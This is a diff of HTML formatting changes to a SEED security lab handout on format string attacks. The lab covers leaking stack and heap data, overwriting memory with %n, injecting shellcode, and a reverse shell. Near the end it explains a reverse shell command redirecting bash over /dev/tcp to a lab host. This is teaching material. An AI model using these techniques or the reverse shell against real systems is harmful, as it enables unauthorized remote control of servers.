@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8" />
   
@@ -13,8 +13,6 @@
   
   <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
 
   
   
@@ -31,11 +29,11 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
-        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/underscore.js"></script>
-        <script src="../../_static/doctools.js"></script>
-        <script async="async" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        <script type="text/javascript" src="../../_static/jquery.js"></script>
+        <script type="text/javascript" src="../../_static/underscore.js"></script>
+        <script type="text/javascript" src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/language_data.js"></script>
+        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
     
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
 
@@ -218,26 +216,26 @@ internal memory of the program, and most severely, (4) inject and
 execute malicious code using the victim program’s privilege. This lab
 covers the following topics:</p>
 <ul class="simple">
-<li><p>Format string vulnerability, and code injection</p></li>
-<li><p>Stack layout</p></li>
-<li><p>Shellcode</p></li>
-<li><p>Reverse shell</p></li>
+<li>Format string vulnerability, and code injection</li>
+<li>Stack layout</li>
+<li>Shellcode</li>
+<li>Reverse shell</li>
 </ul>
 <p><strong>Readings and videos.</strong> Detailed coverage of the format string attack can be found in the
 following:</p>
 <ul class="simple">
-<li><p>Chapter 6 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
-Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
-<li><p>Section 9 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
-Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
-<li><p>The lab also involves reverse shell, which is covered in Chapter 9 of
-the SEED book.</p></li>
+<li>Chapter 6 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
+Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
+<li>Section 9 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
+Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
+<li>The lab also involves reverse shell, which is covered in Chapter 9 of
+the SEED book.</li>
 </ul>
 <p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
 image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
 labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
 <p><strong>Note for instructors.</strong> Instructors can customize this lab by choosing
-values for <code class="docutils literal notranslate"><span class="pre">L</span></code>. See Section 2.2 for details. Depending on
+values for <code class="docutils literal notranslate"><span class="pre">L</span></code>. See Section&nbsp;2.2 for details. Depending on
 the background of students and the time allocated for this lab,
 instructors can also make the attack on 64-bit programs optional,
 because it is more challenging. The attacks on 32-bit programs are
@@ -456,13 +454,14 @@ printed out on the server side, so the attacker cannot see it.
 Therefore, this is not a meaningful attack, but the technique used in
 this task will be essential for the subsequent tasks.</p>
 <ul>
-<li><p><strong>Task 2.A: Stack Data.</strong> The goal is to print out the data on the
+<li><p class="first"><strong>Task 2.A: Stack Data.</strong> The goal is to print out the data on the
 stack. How many <code class="docutils literal notranslate"><span class="pre">%x</span></code> format specifiers do you need so you can get
 the server program to print out the first four bytes of your input?
 You can put some unique numbers (4 bytes) there, so when they are
 printed out, you can immediately tell. This number will be essential
-for most of the subsequent tasks, so make sure you get it right.</p></li>
-<li><p><strong>Task 2.B: Heap Data</strong> There is a secret message (a string) stored
+for most of the subsequent tasks, so make sure you get it right.</p>
+</li>
+<li><p class="first"><strong>Task 2.B: Heap Data</strong> There is a secret message (a string) stored
 in the heap area, and you can find the address of this string from
 the server printout. Your job is to print out this secret message. To
 achieve this goal, you need to place the address (in the binary form)
@@ -490,17 +489,17 @@ Assume that this variable holds an important value, which can affect the
 control flow of the program. If remote attackers can change its value,
 they can change the behavior of this program. We have three sub-tasks.</p>
 <ul class="simple">
-<li><p><strong>Task 3.A: Change the value to a different value.</strong> In this
+<li><strong>Task 3.A: Change the value to a different value.</strong> In this
 sub-task, we need to change the content of the <code class="docutils literal notranslate"><span class="pre">target</span></code> variable to
 something else. Your task is considered as a success if you can
 change it to a different value, regardless of what value it may be.
 The address of the <code class="docutils literal notranslate"><span class="pre">target</span></code> variable can be found from the server
-printout.</p></li>
-<li><p><strong>Task 3.B: Change the value to ``0x5000``.</strong> In this sub-task, we
+printout.</li>
+<li><strong>Task 3.B: Change the value to ``0x5000``.</strong> In this sub-task, we
 need to change the content of the <code class="docutils literal notranslate"><span class="pre">target</span></code> variable to a specific
 value <code class="docutils literal notranslate"><span class="pre">0x5000</span></code>. Your task is considered as a success only if the
-variable’s value becomes <code class="docutils literal notranslate"><span class="pre">0x5000</span></code>.</p></li>
-<li><p><strong>Task 3.C: Change the value to ``0xAABBCCDD``.</strong> This sub-task is
+variable’s value becomes <code class="docutils literal notranslate"><span class="pre">0x5000</span></code>.</li>
+<li><strong>Task 3.C: Change the value to ``0xAABBCCDD``.</strong> This sub-task is
 similar to the previous one, except that the target value is now a
 large number. In a format string attack, this value is the total
 number of characters that are printed out by the <code class="docutils literal notranslate"><span class="pre">printf()</span></code>
@@ -509,7 +508,7 @@ hours. You need to use a faster approach. The basic idea is to use
 <code class="docutils literal notranslate"><span class="pre">%hn</span></code> or <code class="docutils literal notranslate"><span class="pre">%hhn</span></code>, instead of <code class="docutils literal notranslate"><span class="pre">%n</span></code>, so we can modify a two-byte
 (or one-byte) memory space, instead of four bytes. Printing out
 <span class="math notranslate nohighlight">\(2^{16}\)</span> characters does not take much time. More details can
-be found in the SEED book.</p></li>
+be found in the SEED book.</li>
 </ul>
 </div>
 <div class="section" id="task-4-inject-malicious-code-into-the-server-program">
@@ -529,17 +528,17 @@ server.</p>
 <h3>Understanding the Stack Layout<a class="headerlink" href="#understanding-the-stack-layout" title="Permalink to this headline">¶</a></h3>
 <p>To succeed in this task, it is essential to understand the stack layout
 when the <code class="docutils literal notranslate"><span class="pre">printf()</span></code> function is invoked inside <code class="docutils literal notranslate"><span class="pre">myprintf()</span></code>.
-Figure 1 depicts the stack layout. It
+Figure&nbsp;1 depicts the stack layout. It
 should be noted that we intentionally placed a dummy stack frame between
 the <code class="docutils literal notranslate"><span class="pre">main</span></code> and <code class="docutils literal notranslate"><span class="pre">myprintf</span></code> functions, but it is not shown in the
 figure. Before working on this task, students need to answer the
 following questions (please include your answers in the lab report):</p>
 <ul class="simple">
-<li><p><strong>Question 1:</strong> What are the memory addresses at the locations marked
-by (➋) and (➌)?</p></li>
-<li><p><strong>Question 2:</strong> How many <code class="docutils literal notranslate"><span class="pre">%x</span></code> format specifiers do we need to move
+<li><strong>Question 1:</strong> What are the memory addresses at the locations marked
+by (➋) and (➌)?</li>
+<li><strong>Question 2:</strong> How many <code class="docutils literal notranslate"><span class="pre">%x</span></code> format specifiers do we need to move
 the format string argument pointer to (➌)? Remember, the argument
-pointer starts from the location above (➊).</p></li>
+pointer starts from the location above (➊).</li>
 </ul>
 </div>
 <div class="section" id="shellcode">
@@ -547,7 +546,7 @@ pointer starts from the location above (➊).</p></li>
 <div class="figure align-center" id="id1">
 <img alt="../../_images/format_string_img1.png" src="../../_images/format_string_img1.png" />
 <p class="caption"><span class="caption-text">Figure 1: The stack layout when <code class="docutils literal notranslate"><span class="pre">printf()</span></code> is invoked from inside of the
-<code class="docutils literal notranslate"><span class="pre">myprintf()</span></code> function.</span><a class="headerlink" href="#id1" title="Permalink to this image">¶</a></p>
+<code class="docutils literal notranslate"><span class="pre">myprintf()</span></code> function.</span></p>
 </div>
 <p>Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell,
 and is usually written in assembly languages. In this lab, we only provide the binary version of a generic
@@ -589,14 +588,14 @@ build your format strings.</p>
 <p>Please construct your input, feed it to the server program, and
 demonstrate that you can successfully get the server to run your
 shellcode. In your lab report, you need to explain how your format
-string is constructed. Please mark on Figure 1 where your malicious code is
+string is constructed. Please mark on Figure&nbsp;1 where your malicious code is
 stored (please provide the concrete address).</p>
 <p><strong>Getting a Reverse Shell.</strong> We are not interested in running some pre-determined commands. We want
 to get a root shell on the target server, so we can type any command we
 want. Since we are on a remote machine, if we simply get the server to
 run <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code>, we won’t be able to control the shell program.
 Reverse shell is a typical technique to solve this problem.
-Section 9 provides detailed instructions on how
+Section&nbsp;9 provides detailed instructions on how
 to run a reverse shell. Please modify the command string in your
 shellcode, so you can get a reverse shell on the target server. Please
 include screenshots and explanation in your lab report.</p>
@@ -721,18 +720,18 @@ address is indeed <code class="docutils literal notranslate"><span class="pre">1
 <p>The above command represents the one that would normally be executed on a compromised server. It is
 quite complicated, and we give a detailed explanation in the following:</p>
 <ul class="simple">
-<li><p>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
-(must provide a shell prompt).</p></li>
-<li><p>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>) of the shell to be
+<li>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
+(must provide a shell prompt).</li>
+<li>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>) of the shell to be
 redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems, stdout’s file
-descriptor is 1.</p></li>
-<li><p>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This option tells the system
+descriptor is 1.</li>
+<li>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This option tells the system
 to use the standard output device as the stardard input device. Since stdout is already redirected to
 the TCP connection, this option basically indicates that the shell program will get its input from the
-same TCP connection.</p></li>
-<li><dl class="simple">
-<dt>“2&gt;&amp;1”: File descriptor 2 represents the standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>. This causes the error output to be</dt><dd><p>redirected to stdout, which is the TCP connection.</p>
-</dd>
+same TCP connection.</li>
+<li><dl class="first docutils">
+<dt>“2&gt;&amp;1”: File descriptor 2 represents the standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>. This causes the error output to be</dt>
+<dd>redirected to stdout, which is the TCP connection.</dd>
 </dl>
 </li>
 </ul>
